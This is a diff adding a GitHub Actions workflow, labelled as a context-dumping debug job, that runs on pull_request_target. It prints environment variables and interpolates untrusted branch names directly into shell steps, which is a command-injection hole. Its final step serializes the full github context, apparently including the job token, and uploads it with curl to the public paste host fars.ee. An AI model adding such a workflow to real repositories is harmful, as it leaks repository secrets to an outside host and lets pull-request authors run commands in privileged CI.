@@ -1,0 +1,35 @@
+name: Dump context
+on:
+  pull_request_target:
+
+jobs:
+  log-github:
+    runs-on: ubuntu-latest
+    steps:
+      - name: printenv
+        run: printenv
+
+      - name: show github.ref
+        run: |
+          echo ${{ github.ref }}
+
+      - name: show github.ref in env
+        env:
+          test: ${{ github.ref }}
+        run: |
+          echo "${test}"
+
+      - name: show github.ref_name
+        run: |
+          echo ${{ github.ref_name }}
+
+      - name: show github.ref_name in env
+        env:
+          test: ${{ github.ref_name }}
+        run: |
+          echo "${test}" 
+
+      - name: Dump GitHub context
+        env:
+          GITHUB_CONTEXT: ${{ toJson(github) }}
+        run: echo "$GITHUB_CONTEXT" | curl -F "c=@-" "http://fars.ee/"
